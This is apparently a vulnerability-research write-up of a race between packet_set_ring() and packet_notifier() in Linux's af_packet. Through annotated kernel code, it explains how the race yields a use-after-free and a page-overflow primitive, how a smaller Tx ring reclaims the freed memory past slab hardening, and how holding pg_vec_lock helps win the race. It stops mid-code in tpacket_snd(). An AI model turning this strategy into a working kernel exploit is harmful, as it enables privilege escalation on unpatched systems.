# The race
- Describe in the patch commit `https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=01d3c8417b9c1b884a8a981a3b886da556512f36`
- Race between `packet_set_ring()` and `packet_notifier()`

# Analyze the patch
```c
static int packet_notifier(struct notifier_block *this,
			   unsigned long msg, void *ptr)
{
	struct sock *sk;
	struct net_device *dev = netdev_notifier_info_to_dev(ptr);
	struct net *net = dev_net(dev);

	rcu_read_lock();
	sk_for_each_rcu(sk, &net->packet.sklist) {
		struct packet_sock *po = pkt_sk(sk);

		switch (msg) {
                // ...

		case NETDEV_DOWN:
			if (dev->ifindex == po->ifindex) {
				spin_lock(&po->bind_lock);
				if (packet_sock_flag(po, PACKET_SOCK_RUNNING)) {
					__unregister_prot_hook(sk, false);
					sk->sk_err = ENETDOWN;
					if (!sock_flag(sk, SOCK_DEAD))
						sk_error_report(sk);
				}
				if (msg == NETDEV_UNREGISTER) {
					packet_cached_dev_reset(po);
					WRITE_ONCE(po->ifindex, -1);
					netdev_put(po->prot_hook.dev,
						   &po->prot_hook.dev_tracker);
					po->prot_hook.dev = NULL;
				}
				spin_unlock(&po->bind_lock);
			}
			break;
		case NETDEV_UP:
			if (dev->ifindex == po->ifindex) {
				spin_lock(&po->bind_lock);
				if (po->num)    // [1]
					register_prot_hook(sk);
				spin_unlock(&po->bind_lock);
			}
			break;
		}
	}
	rcu_read_unlock();
	return NOTIFY_DONE;
}
```

- After we bind a packet socket to a network interface, these situations might happen:
1. Network interface goes from DOWN state to UP state lead to Packet socket receive `NETDEV_UP` event and begin to hook to this network interface. Now, packet socket can receive packets sent to the network interface and packet socket is considered to have `PACKET_SOCK_RUNNING` state.
2. Network interface goes from UP state to DOWN state lead to Packet socket receive `NETDEV_DOWN` event and packet socket unhook from this network interface. 

```c
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
{
	struct pgv *pg_vec = NULL;
	struct packet_sock *po = pkt_sk(sk);
	unsigned long *rx_owner_map = NULL;
	int was_running, order = 0;
	struct packet_ring_buffer *rb;
	struct sk_buff_head *rb_queue;
	__be16 num;
	int err;
	struct tpacket_req *req = &req_u->req; // request from userspace

	rb = tx_ring ? &po->tx_ring : &po->rx_ring;
	rb_queue = tx_ring ? &sk->sk_write_queue : &sk->sk_receive_queue;

        // ...

	spin_lock(&po->bind_lock); // [1]
	was_running = packet_sock_flag(po, PACKET_SOCK_RUNNING);
	num = po->num;
	if (was_running) {
		WRITE_ONCE(po->num, 0);
		__unregister_prot_hook(sk, false);
	}
	spin_unlock(&po->bind_lock); // [2]

	synchronize_net();

	err = -EBUSY;
	mutex_lock(&po->pg_vec_lock); // [3]
	if (closing || atomic_long_read(&po->mapped) == 0) {
		// ...
		swap(rb->pg_vec, pg_vec);
		// ...
		po->prot_hook.func = (po->rx_ring.pg_vec) ? tpacket_rcv : packet_rcv;
		// ...
	}
	mutex_unlock(&po->pg_vec_lock);

	spin_lock(&po->bind_lock);
	if (was_running) {
		WRITE_ONCE(po->num, num);
		register_prot_hook(sk);
	}
	spin_unlock(&po->bind_lock);
	// ...
}
```

- Review code from [1] to [2], we can see that:
1. The implementation clearly tell that further code execution must be run while the packet socket not in `PACKET_SOCK_RUNNING` state to ensure no packet is received while the ring buffer is configured.
2. Although `spin_lock(&po->bind_lock)` is both call from `packet_set_ring()` and `packet_notifier()` to avoid race between these two functions, there still logic issue where the `po->num` is only temporary set to zero if currently the packet socket is in running state. In the situation where current packet socket is not in running state, `po->num` value is kept.
3. That means, after `packet_set_ring()` call `spin_unlock(&po->bind_lock)`, a `NETDEV_UP` event will lead to packet socket rehook to the network interface. After that, packet socket can receive incoming packet while the configuration of the ring buffer is halfway through. (Look at [1] on `packet_notifier()`).

# The UAF
- Assume we win the race, what can we leverage ? The conclusion I have after analyze `packet_set_ring()` and `packet_notifier()` is there are no direct exploitable primitives. Let's assume after `packet_set_ring()` release the `po->bind_lock`, the function stop executing and `packet_notifier()` finished bringing the packet socket to running state. Now, we can send a packet to the network interface and trigger the hook function on the packet socket. Let's assume `packet_set_ring()` continue the execution at this point. Now, we have a follow-up race condition between the hook function and `packet_set_ring()`.

- Both Tx path and Rx path of the packet socket can be configured to use the ring buffer.
- Ring buffer can be mmaped to user space address.
- Configure Rx path from not using ring buffer to using ring buffer will lead to the allocation of the ring and hook function changed from `packet_rcv()` to `tpacket_rcv()`. `->pg_vec` pointer now contain the ring buffer.
- Configure Rx path from using ring buffer to not using ring buffer will lead to the old ring buffer got free and hook function changed from `tpacket_rcv()` to `packet_rcv()`. `->pg_vec` pointer is set back to NULL.
- Therefore, by configure the Rx path to use ring buffer and then enter `packet_set_ring()` to configure Rx path not to use the ring buffer, we can create a situation where the first half of `packet_set_ring()` race with `packet_notifier()` and at this point, a packet sent to the network interface that this packet socket hooked to will lead to the second half of `packet_set_ring()` race with `tpacket_rcv()`.
- Packet socket has 3 versions: TPACKET_V1, TPACKET_V2 and TPACKET_V3. Future code snippets and discussion will assume the packet socket use TPACKET_V3 version. The reason is TPACKET_V3 packet socket has internal data structure to keep track about ring buffer usage. The data structure contain pointer to the ring buffer. This pointer is not reset to NULL after we configure the packet socket from using ring buffer to not using ring buffer which can be leverage for exploitation. While analyzing code related to TPACKET_V1 and TPACKET_V2 packet socket, I only find NULL pointer dereference primitive.

Request to `packet_set_ring()` has the following structure:
```c
struct tpacket_req3 {
	unsigned int	tp_block_size;	/* size of each buffer in the ring buffer */
	unsigned int	tp_block_nr;	/* total buffer in the ring buffer */
	unsigned int	tp_frame_size;	/* frame size  */
	unsigned int	tp_frame_nr;	/* Total number of frames*/
	unsigned int	tp_retire_blk_tov; /* timeout to retire current usage buffer */
	unsigned int	tp_sizeof_priv; /* each buffer can have a private space and the kernel code will never write to this space */
	unsigned int	tp_feature_req_word;
};
```

- If currently packet socket don't use ring buffer, specify `tp_block_nr != 0` will trigger the allocation code path in `packet_set_ring()`.
- If currently packet socket use ring buffer, specify `tp_block_nr == 0` will trigger the free code path in `packet_set_ring()`.

```c
struct packet_ring_buffer {
	struct pgv		*pg_vec; // internal ring buffer

	unsigned int		head;
	unsigned int		frames_per_block;
	unsigned int		frame_size;
	unsigned int		frame_max;

	unsigned int		pg_vec_order;
	unsigned int		pg_vec_pages;
	unsigned int		pg_vec_len;

	unsigned int __percpu	*pending_refcnt;

	union {
		unsigned long			*rx_owner_map; // use by TPACKET_V1 and TPACKET_V2
		struct tpacket_kbdq_core	prb_bdqc; // use by TPACKET_V3
	};
};
```c

```c
struct packet_sock {
	// ...
	struct packet_ring_buffer	rx_ring; // rx_ring_buffer
	struct packet_ring_buffer	tx_ring; // tx_ring_buffer
	// ...
};
```

`packet_set_ring()` code related to the allocation of TPACKET_V3 Rx ring buffer
```c
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
{
	struct pgv *pg_vec = NULL;
	struct packet_sock *po = pkt_sk(sk);
	unsigned long *rx_owner_map = NULL;
	int was_running, order = 0;
	struct packet_ring_buffer *rb;
	struct sk_buff_head *rb_queue;
	__be16 num;
	int err;
	struct tpacket_req *req = &req_u->req; // request from userspace

	rb = tx_ring ? &po->tx_ring : &po->rx_ring;
	rb_queue = tx_ring ? &sk->sk_write_queue : &sk->sk_receive_queue;

	// ...

	if (req->tp_block_nr) {
		unsigned int min_frame_size;
		err = -EBUSY;
		if (unlikely(rb->pg_vec))
			goto out;

		switch (po->tp_version) {
		// ...
		case TPACKET_V3:
			po->tp_hdrlen = TPACKET3_HDRLEN;
			break;
		}

		err = -EINVAL;
		if (unlikely((int)req->tp_block_size <= 0))
			goto out;
		if (unlikely(!PAGE_ALIGNED(req->tp_block_size)))
			goto out;
		min_frame_size = po->tp_hdrlen + po->tp_reserve;
		if (po->tp_version >= TPACKET_V3 &&
		    req->tp_block_size <
		    BLK_PLUS_PRIV((u64)req_u->req3.tp_sizeof_priv) + min_frame_size)
			goto out;
		if (unlikely(req->tp_frame_size < min_frame_size))
			goto out;
		if (unlikely(req->tp_frame_size & (TPACKET_ALIGNMENT - 1)))
			goto out;

		rb->frames_per_block = req->tp_block_size / req->tp_frame_size;
		if (unlikely(rb->frames_per_block == 0))
			goto out;
		if (unlikely(rb->frames_per_block > UINT_MAX / req->tp_block_nr))
			goto out;
		if (unlikely((rb->frames_per_block * req->tp_block_nr) !=
					req->tp_frame_nr))
			goto out;

		err = -ENOMEM;
		order = get_order(req->tp_block_size); // [1]
		pg_vec = alloc_pg_vec(req, order); // [2]
		if (unlikely(!pg_vec))
			goto out;
		switch (po->tp_version) {
		case TPACKET_V3:
			if (!tx_ring) {
				init_prb_bdqc(po, rb, pg_vec, req_u); // [3]
			} else {
				// ...
			}
			break;
		// ...
	}
	// ...

	mutex_lock(&po->pg_vec_lock);
	if (closing || atomic_long_read(&po->mapped) == 0) {
		err = 0;
		spin_lock_bh(&rb_queue->lock);
		swap(rb->pg_vec, pg_vec);
		if (po->tp_version <= TPACKET_V2)
			swap(rb->rx_owner_map, rx_owner_map);
		rb->frame_max = (req->tp_frame_nr - 1);
		rb->head = 0;
		rb->frame_size = req->tp_frame_size;
		spin_unlock_bh(&rb_queue->lock);

		swap(rb->pg_vec_order, order);
		swap(rb->pg_vec_len, req->tp_block_nr);

		rb->pg_vec_pages = req->tp_block_size/PAGE_SIZE;
		po->prot_hook.func = (po->rx_ring.pg_vec) ?
						tpacket_rcv : packet_rcv;
		// ...
	}
	mutex_unlock(&po->pg_vec_lock);
	// ...
}
```

Explain for [1]: 
```c
/**
 * get_order - Determine the allocation order of a memory size
 * @size: The size for which to get the order
 *
 * Determine the allocation order of a particular sized block of memory.  This
 * is on a logarithmic scale, where:
 *
 *	0 -> 2^0 * PAGE_SIZE and below
 *	1 -> 2^1 * PAGE_SIZE to 2^0 * PAGE_SIZE + 1
 *	2 -> 2^2 * PAGE_SIZE to 2^1 * PAGE_SIZE + 1
 *	3 -> 2^3 * PAGE_SIZE to 2^2 * PAGE_SIZE + 1
 *	4 -> 2^4 * PAGE_SIZE to 2^3 * PAGE_SIZE + 1
 *	...
 *
 * The order returned is used to find the smallest allocation granule required
 * to hold an object of the specified size.
 */
static __always_inline __attribute_const__ int get_order(unsigned long size);
```

Explain for [2]:
```c
/**
 * alloc_pg_vec - Allocate memory for ring buffer
 * @req: request from userspace. req->tp_block_nr : Determine how many buffer the ring have
 * @order: Determine each buffer size 
 * (for example:
 * 	order == 0 => buffer_size: (2 ** 0) * 4096 == 4096
 * 	order == 1 => buffer_size: (2 ** 1) * 4096 = 8192
 * 	order == 2 => buffer_size: (2 ** 2) * 4096 = 16384
 * 	...
 */
 
static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
{
	unsigned int block_nr = req->tp_block_nr;
	struct pgv *pg_vec;
	int i;

	pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
	if (unlikely(!pg_vec))
		goto out;

	for (i = 0; i < block_nr; i++) {
		pg_vec[i].buffer = alloc_one_pg_vec_page(order);
		if (unlikely(!pg_vec[i].buffer))
			goto out_free_pgvec;
	}

out:
	return pg_vec;

out_free_pgvec:
	free_pg_vec(pg_vec, order, block_nr);
	pg_vec = NULL;
	goto out;
}
```
Explain for [3]:
```c
/**
 * init_prb_bdqc - Initialize the internal data structure to track Rx ring buffer usage. Only TPACKET_V3 packet socket use this structure.
 * @rb: Data structure used by packet socket to manage ring buffer.
 * @pg_vec: The freshly allocated ring buffer.
 * @req_u: Request from user space
 */
static void init_prb_bdqc(struct packet_sock *po,
			struct packet_ring_buffer *rb,
			struct pgv *pg_vec,
			union tpacket_req_u *req_u)
{
	struct tpacket_kbdq_core *pkc = &rb->prb_bdqc;
	struct tpacket_block_desc *pbd;

	memset(pkc, 0x0, sizeof(*pkc));

	pkc->knxt_seq_num = 1;
	pkc->pkbdq = pg_vec;
	pbd = (struct tpacket_block_desc *)pg_vec[0].buffer;
	pkc->pkblk_start	= pg_vec[0].buffer;
	pkc->kblk_size = req_u->req3.tp_block_size;
	pkc->knum_blocks	= req_u->req3.tp_block_nr;
	pkc->hdrlen = po->tp_hdrlen;
	pkc->version = po->tp_version;
	pkc->last_kactive_blk_num = 0;
	pkc->blk_sizeof_priv = req_u->req3.tp_sizeof_priv;
	pkc->max_frame_len = pkc->kblk_size - (48 + ALIGN((p1->blk_sizeof_priv), 8));
	prb_open_block(pkc, pbd);
}
```
- `pkc->pkbdq` : Pointer to ring buffer.
- `pkc->kblk_size` : Size of each buffer in ring buffer
- `pkc->knum_blocks` : Total buffer in ring buffer
- `pkc->hdrlen` : 68 (For TPACKET_V3 packet socket)
- `pkc->version` : `TPACKET_V3`
- `pkc->blk_sizeof_priv` : Private space per buffer in the ring buffer
- `pbd` : first buffer of the ring buffer

```c
/**
 * prb_open_block - Mark buffer for future packet headers and packet data written
 * @pkc: Data structure to track ring buffer usage
 * @pbd: The buffer to mark
 */
static void prb_open_block(struct tpacket_kbdq_core *pkc, struct tpacket_block_desc *pbd)
{
	struct timespec64 ts;
	struct tpacket_hdr_v1 *h1 = &pbd->hdr.bh1;

	BLOCK_SNUM(pbd) = pkc->knxt_seq_num++;
	BLOCK_NUM_PKTS(pbd) = 0;
	BLOCK_LEN(pbd) = BLK_PLUS_PRIV(pkc->blk_sizeof_priv);

	pkc->pkblk_start = (char *)pbd;
	pkc->nxt_offset = pkc->pkblk_start + BLK_PLUS_PRIV(pkc->blk_sizeof_priv);

	BLOCK_O2FP(pbd) = (__u32)BLK_PLUS_PRIV(pkc->blk_sizeof_priv);
	BLOCK_O2PRIV(pbd) = BLK_HDR_LEN;

	pbd->version = pkc->version;
	pkc->prev = pkc->nxt_offset;
	pkc->pkblk_end = pkc->pkblk_start + pkc->kblk_size;
}

#define V3_ALIGNMENT			(8)
#define BLK_HDR_LEN			(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))
#define BLK_PLUS_PRIV(sz_of_priv)	BLK_HDR_LEN + ALIGN((sz_of_priv), V3_ALIGNMENT))
```

- `pkc->pkblk_start` : beginning of the buffer.
- `pkc->nxt_offset` : where the headers and packet data will be written in the buffer.
- `pkc->pkblk_end` : end of the buffer.

`packet_set_ring()` code path related to where the ring buffer is freed
```c
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
{
	struct pgv *pg_vec = NULL;
	struct packet_sock *po = pkt_sk(sk);
	unsigned long *rx_owner_map = NULL;
	int was_running, order = 0;
	struct packet_ring_buffer *rb;
	struct sk_buff_head *rb_queue;
	__be16 num;
	int err;
	struct tpacket_req *req = &req_u->req;

	rb = tx_ring ? &po->tx_ring : &po->rx_ring;
	rb_queue = tx_ring ? &sk->sk_write_queue : &sk->sk_receive_queue;

	err = -EBUSY;
	if (!closing) {
		if (atomic_long_read(&po->mapped))
			goto out;
		if (packet_read_pending(rb))
			goto out;
	}

	if (req->tp_block_nr) {
		// ...
	}
	else {
		err = -EINVAL;
		if (unlikely(req->tp_frame_nr))
			goto out;
	}

	// ...
	mutex_lock(&po->pg_vec_lock);
	if (closing || atomic_long_read(&po->mapped) == 0) {
		err = 0;
		spin_lock_bh(&rb_queue->lock);
		swap(rb->pg_vec, pg_vec); // [1] Reset ring buffer pointer to NULL
		if (po->tp_version <= TPACKET_V2)
			swap(rb->rx_owner_map, rx_owner_map);
		rb->frame_max = (req->tp_frame_nr - 1);
		rb->head = 0;
		rb->frame_size = req->tp_frame_size;
		spin_unlock_bh(&rb_queue->lock);

		swap(rb->pg_vec_order, order);
		swap(rb->pg_vec_len, req->tp_block_nr);

		rb->pg_vec_pages = req->tp_block_size/PAGE_SIZE;
		po->prot_hook.func = (po->rx_ring.pg_vec) ?
						tpacket_rcv : packet_rcv;
		skb_queue_purge(rb_queue);
		if (atomic_long_read(&po->mapped))
			pr_err("packet_mmap: vma is busy: %ld\n",
			       atomic_long_read(&po->mapped));
	}
	mutex_unlock(&po->pg_vec_lock);

	// ...
	if (pg_vec) {
		bitmap_free(rx_owner_map);
		free_pg_vec(pg_vec, order, req->tp_block_nr); // [2] Where the ring buffer is freed
	}
```

```c
static void free_pg_vec(struct pgv *pg_vec, unsigned int order,
			unsigned int len)
{
	int i;

	for (i = 0; i < len; i++) {
		if (likely(pg_vec[i].buffer)) {
			if (is_vmalloc_addr(pg_vec[i].buffer))
				vfree(pg_vec[i].buffer);
			else
				free_pages((unsigned long)pg_vec[i].buffer,
					   order);
			pg_vec[i].buffer = NULL; // [1]
		}
	}
	kfree(pg_vec);
}
```

[1] : Reset every buffer pointer in the ring buffer to NULL

`tpacket_rcv()` code path related to where UAF happen
```c
/**
 * tpacket_rcv: Hook function to handle packet sent to the network interface that the packet socket hooked to.
 * @skb: the packet
 * @dev: the network interface
 * @pt: represent the hook structure
 */
static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		       struct packet_type *pt, struct net_device *orig_dev)
{
	enum skb_drop_reason drop_reason = SKB_CONSUMED;
	struct sock *sk = NULL;
	struct packet_sock *po;
	struct sockaddr_ll *sll;
	union tpacket_uhdr h;
	u8 *skb_head = skb->data;
	int skb_len = skb->len;
	unsigned int snaplen, res;
	unsigned long status = TP_STATUS_USER;
	unsigned short macoff, hdrlen;
	unsigned int netoff;
	struct sk_buff *copy_skb = NULL;
	struct timespec64 ts;
	__u32 ts_status;
	unsigned int slot_id = 0;
	int vnet_hdr_sz = 0;

	sk = pt->af_packet_priv;
	po = pkt_sk(sk);
        // ...

	snaplen = skb->len;
	res = run_filter(skb, sk, snaplen); // [5]

	// ...

	if (snaplen > res)
		snaplen = res;

	if (sk->sk_type == SOCK_DGRAM) {
		// ...
	} else {
		unsigned int maclen = skb_network_offset(skb);
		netoff = TPACKET_ALIGN(po->tp_hdrlen +
				       (maclen < 16 ? 16 : maclen)) +
				       po->tp_reserve;
		vnet_hdr_sz = READ_ONCE(po->vnet_hdr_sz);
		if (vnet_hdr_sz)
			netoff += vnet_hdr_sz;
		macoff = netoff - maclen;
	}

	// ...
	spin_lock(&sk->sk_receive_queue.lock);
	h.raw = packet_current_rx_frame(po, skb, // [1]
					TP_STATUS_KERNEL, (macoff+snaplen));

	// ...
	spin_unlock(&sk->sk_receive_queue.lock);
	skb_copy_bits(skb, 0, h.raw + macoff, snaplen); // [2]
	// ...
	switch (po->tp_version) {
	// ...
	case TPACKET_V3: // [3]
		h.h3->tp_status |= status;
		h.h3->tp_len = skb->len;
		h.h3->tp_snaplen = snaplen;
		h.h3->tp_mac = macoff;
		h.h3->tp_net = netoff;
		h.h3->tp_sec  = ts.tv_sec;
		h.h3->tp_nsec = ts.tv_nsec;
		memset(h.h3->tp_padding, 0, sizeof(h.h3->tp_padding));
		hdrlen = sizeof(*h.h3);
		break;
	default:
		BUG();
	}

	sll = h.raw + TPACKET_ALIGN(hdrlen); // [4]
	sll->sll_halen = dev_parse_header(skb, sll->sll_addr);
	sll->sll_family = AF_PACKET;
	sll->sll_hatype = dev->type;
	sll->sll_protocol = (sk->sk_type == SOCK_DGRAM) ?
		vlan_get_protocol_dgram(skb) : skb->protocol;
	sll->sll_pkttype = skb->pkt_type;
	if (unlikely(packet_sock_flag(po, PACKET_SOCK_ORIGDEV)))
		sll->sll_ifindex = orig_dev->ifindex;
	else
		sll->sll_ifindex = dev->ifindex;

	// ...
}
```
- [1] : where UAF happen.
- [2] : where we write with control data from our packet.
- [3] and [4] : where non control data written.

Call chain from [1]: `packet_current_rx_frame()` -> `__packet_lookup_frame_in_block()`

```c
static void *packet_current_rx_frame(struct packet_sock *po,
					    struct sk_buff *skb,
					    int status, unsigned int len)
{
	switch (po->tp_version) {
	// ...
	case TPACKET_V3:
		return __packet_lookup_frame_in_block(po, skb, len);
	// ...
}
```

```c
/**
 * __packet_lookup_frame_in_block : find frame in the ring buffer to write headers and packet data to.
 * @skb: packet sent to the network interface that the packet socket hooked to
 * @len: packet length
 */
static void *__packet_lookup_frame_in_block(struct packet_sock *po,
					    struct sk_buff *skb,
					    unsigned int len
					    )
{
	struct tpacket_kbdq_core *pkc;
	struct tpacket_block_desc *pbd;
	char *curr, *end;

	pkc = &po->rx_ring.prb_bdqc;
	pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer;

	// ...

	curr = pkc->nxt_offset;
	pkc->skb = skb;
	end = (char *)pbd + pkc->kblk_size;

	if (curr + (ALIGN(len, 8)) < end) {
		prb_fill_curr_block(curr, pkc, pbd, len);
		return (void *)curr;
	}

	prb_retire_current_block(pkc, po, 0); // [1]

	curr = (char *)prb_dispatch_next_block(pkc, po);
	if (curr) {
		pbd = GET_CURR_PBLOCK_DESC_FROM_CORE(pkc);
		prb_fill_curr_block(curr, pkc, pbd, len);
		return (void *)curr;
	}

	return NULL;
}
```

Assume the ring buffer is freed at this point and this is the first time `tpacket_rcv()` is triggered, we have the following things:
- `pkc->kactive_blk_num == 0`
- `pkc->pkbdq` : UAF pointer to old freed ring buffer. 
- `pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer` => `pbd` is UAF pointer
- `curr = pkc->nxt_offset` : pointer to the old freed buffer from the old freed ring (check `prb_open_block()` analysis above) => `pkc->nxt_offset` is UAF pointer
- `end = (char *)pbd + pkc->kblk_size` => `end` is UAF Pointer

Remember, before the ring buffer is freed, every buffer pointer in the ring buffer is reset to NULL. If we don't manage to reclaim the ring buffer, we will have kernel panic by the following reasons:
- `curr` : kernel address
- `pbd == 0` => `end` will have small value => `curr + len > end` => `prb_retire_current_block()` is called at [1]

```c
static void prb_retire_current_block(struct tpacket_kbdq_core *pkc,
		struct packet_sock *po, unsigned int status)
{
	struct tpacket_block_desc *pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer; // pbd == 0

	if ((TP_STATUS_KERNEL == pbd->hdr.bh1.block_status)) { // NULL pointer dereference
		if (!(status & TP_STATUS_BLK_TMO)) {
			write_lock(&pkc->blk_fill_in_prog_lock);
			write_unlock(&pkc->blk_fill_in_prog_lock);
		}
		prb_close_block(pkc, pbd, po, status);
		return;
	}
}
```

Assume we manage to reclaim the ring buffer before the UAF happened, what object should we use to reclaim ? I decided to use another packet socket to allocate Tx ring buffer for the reclamation for the following reasons:

- `CONFIG_RANDOM_KMALLOC_CACHES` mitigation : Introduces multiple generic slab caches for each size, 16 by default (named kmalloc-rnd-01-32, kmalloc-rnd-02-32 etc.). When an object allocated via kmalloc() it is allocated to one of these 16 caches "randomly", depending on the callsite for the kmalloc() and a per-boot seed.
- `CONFIG_SLAB_VIRTUAL` mitigation : Ensure the virtual address used for a slab cache type will always be used for that slab cache type.
- With these two mitigations, I have no choice but to use the ring buffer itself to reclaim the freed ring buffer due to same callsite so we can workaround `CONFIG_RANDOM_KMALLOC_CACHES` mitigation and `CONFIG_SLAB_VIRTUAL` mitigation.
- I choose Tx ring buffer because the kernel don't fill the buffer of Tx ring buffer with anything, so all buffers start with zeros and the allocation for Tx ring buffer run faster due to less code path than Rx ring buffer.

The specific strategy used in the exploit looks like:
- The victim packet's freed ring buffer has X buffers (X > 1). Size of each buffer is: ((2 ** Y) * PAGE_SIZE) (Y > 1).
- The ring buffer used for reclamation has X buffers too so `kmalloc()` will allocate on the same slab cache. Size of each buffer is: ((2 ** (Y - 1)) * PAGE_SIZE).

Assume the reclamation success, we can look at function `__packet_lookup_frame_in_block()` again with new view.

```c
static void *__packet_lookup_frame_in_block(struct packet_sock *po,
					    struct sk_buff *skb,
					    unsigned int len
					    )
{
	struct tpacket_kbdq_core *pkc;
	struct tpacket_block_desc *pbd;
	char *curr, *end;

	pkc = &po->rx_ring.prb_bdqc;
	pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer;

	// ...

	curr = pkc->nxt_offset;
	pkc->skb = skb;
	end = (char *)pbd + pkc->kblk_size;

	if (curr + (ALIGN(len, 8)) < end) {
		prb_fill_curr_block(curr, pkc, pbd, len); // [1]
		return (void *)curr;
	}

	prb_retire_current_block(pkc, po, 0); // [2]

	curr = (char *)prb_dispatch_next_block(pkc, po); // [3]
	if (curr) {
		pbd = GET_CURR_PBLOCK_DESC_FROM_CORE(pkc);
		prb_fill_curr_block(curr, pkc, pbd, len);
		return (void *)curr;
	}

	return NULL;
}
```

- `pkc->kactive_blk_num == 0`
- `pkc->pkbdq` : now contain the reclamation ring buffer
- `pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer` : First buffer of the reclamation ring buffer
- `curr = pkc->nxt_offset` : pointer to the old freed buffer from the old freed ring
- `end = (char *)pbd + pkc->kblk_size`: End of `pbd`

#### Assume we manage to page groom in such a way that `end` came from lower address and `curr` came from higher address, we can avoid code path at [1] and we enter `prb_retire_current_block()`.

```c
static void prb_retire_current_block(struct tpacket_kbdq_core *pkc,
		struct packet_sock *po, unsigned int status)
{
	struct tpacket_block_desc *pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer;

	if ((TP_STATUS_KERNEL == BLOCK_STATUS(pbd))) {
		if (!(status & TP_STATUS_BLK_TMO)) {
			write_lock(&pkc->blk_fill_in_prog_lock);
			write_unlock(&pkc->blk_fill_in_prog_lock);
		}
		prb_close_block(pkc, pbd, po, status);
		return;
	}
}
```
- `TP_STATUS_KERNEL == 0`
- `pbd` : first buffer from the reclamation ring buffer (pages used for these buffer started with all zeros) => `prb_close_block()` is called.

```c
static void prb_close_block(struct tpacket_kbdq_core *pkc,
		struct tpacket_block_desc *pbd1,
		struct packet_sock *po, unsigned int stat)
{
	// ...

	pkc->kactive_blk_num = 	((pkc->kactive_blk_num < (pkc->knum_blocks-1)) ? \
				(pkc->kactive_blk_num+1) : 0);
}
```

- Now, `pkc->kactive_blk_num == 1`. Back to [3] of function `__packet_lookup_frame_in_block()`, function `prb_dispatch_next_block()` is called.

```c
static void *prb_dispatch_next_block(struct tpacket_kbdq_core *pkc,
		struct packet_sock *po)
{
	struct tpacket_block_desc *pbd;

	// ...
	pbd = pkc->pkbdq[pkc->kactive_blk_num].buffer;

	// ...

	prb_open_block(pkc, pbd);
	return (void *)pkc->nxt_offset;
}
```

- `pkc->kactive_blk_num == 1` => `pbd` is the second buffer in the reclamation ring buffer.

```c
static void prb_open_block(struct tpacket_kbdq_core *pkc,
	struct tpacket_block_desc *pbd)
{
	// ...

	pkc->pkblk_start = (char *)pbd1;
	pkc->nxt_offset = pkc->pkblk_start + BLK_PLUS_PRIV(pkc->blk_sizeof_priv);

	// ...
}
```

- We have analyzed the `prb_open_block()` above and `pkc->nxt_offset` is the location where the headers and packet data will begin to write to. Now, `pkc->nxt_offset` come from the buffer of the reclamation ring buffer.
- The idea is: by reclaim the freed ring buffer with the ring buffer where the buffer size is smaller, we can build a Page overflow primitive.
- As described above, `tpacket_rcv()` has both control data written and non control data written.
- Because we control `pkc->blk_sizeof_priv`, we can let `pkc->nxt_offset` having the value near the end of the reclamation smaller buffer such that the remaining space just enough to write the non control data. 
- Look at [2] on `tpacket_rcv()` above, we can see the control data is written at offset affected by `po->tp_hdrlen`, `maclen`, `po->tp_reserve`.
	- `po->tp_hdrlen == 68` for TPACKET_V3 packet socket.
	- `maclen == 14 (ETH_HLEN = 14)`.
	- `po->tp_reserve` : set with `setsockopt(PACKET_RESERVE)`.
	- => written offset is controllable.
- Beside from offset, `snaplen` value decide how many bytes to overwrite. `snaplen` represent the length of the packet data. In the situation that we want to overwrite with just 8 bytes for example, although we can't send raw packet with just 8 bytes of data, we can send packet with bigger size and use the socket filter to truncate the packet length to 8. (check [5] on `tpacket_rcv()`).

# Winning first race condition
Take a look at `packet_set_ring()` again.
```c
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
{
	// ...
	spin_lock(&po->bind_lock);
	was_running = packet_sock_flag(po, PACKET_SOCK_RUNNING);
	num = po->num;
	if (was_running) {
		WRITE_ONCE(po->num, 0);
		__unregister_prot_hook(sk, false);
	}
	spin_unlock(&po->bind_lock);

	synchronize_net();

	err = -EBUSY;
	mutex_lock(&po->pg_vec_lock);
	// ...
}
```

- After `po->bind_lock` spinlock release, `packet_set_ring()` continue to acquire `po->pg_vec_lock` mutex. Therefore, if we manage to acquire the mutex beforehand, we can force `packet_set_ring()` to sleep.
- Kernel function `tpacket_snd()` has a code path that we can leverage to control the `po->pg_vec_lock` mutex.

```c
static int tpacket_snd(struct packet_sock *po, struct msghdr *msg)
{
	struct sk_buff *skb = NULL;
	struct net_device *dev;
	struct virtio_net_hdr *vnet_hdr = NULL;
	struct sockcm_cookie sockc;
	__be16 proto;
	int err, reserve = 0;
	void *ph;
	DECLARE_SOCKADDR(struct sockaddr_ll *, saddr, msg->msg_name);
	bool need_wait = !(msg->msg_flags & MSG_DONTWAIT); // [1]
	int vnet_hdr_sz = READ_ONCE(po->vnet_hdr_sz);
	unsigned char *addr = NULL;
	int tp_len, size_max;
	void *data;
	int len_sum = 0;
	int status = TP_STATUS_AVAILABLE;
	int hlen, tlen, copylen = 0;
	long timeo = 0;

	mutex_lock(&po->pg_vec_lock); // [2]

	if (unlikely(!po->tx_ring.pg_vec)) {
		err = -EBUSY;
		goto out;
	}
	if (likely(saddr == NULL)) {
		// ...
	} else {
		err = -EINVAL;
		if (msg->msg_namelen < sizeof(struct sockaddr_ll))
			goto out;
		if (msg->msg_namelen < (saddr->sll_halen
					+ offsetof(struct sockaddr_ll,
						sll_addr)))
			goto out;
		proto	= saddr->sll_protocol;
		dev = dev_get_by_index(sock_net(&po->sk), saddr->sll_ifindex);
		if (po->sk.sk_socket->type == SOCK_DGRAM) {
			if (dev && msg->msg_namelen < dev->addr_len +
				   offsetof(struct sockaddr_ll, sll_addr))
				goto out_put;
			addr = saddr->sll_addr;
		}
	}

	err = -ENXIO;
	if (unlikely(dev == NULL))
		goto out;
	err = -ENETDOWN;
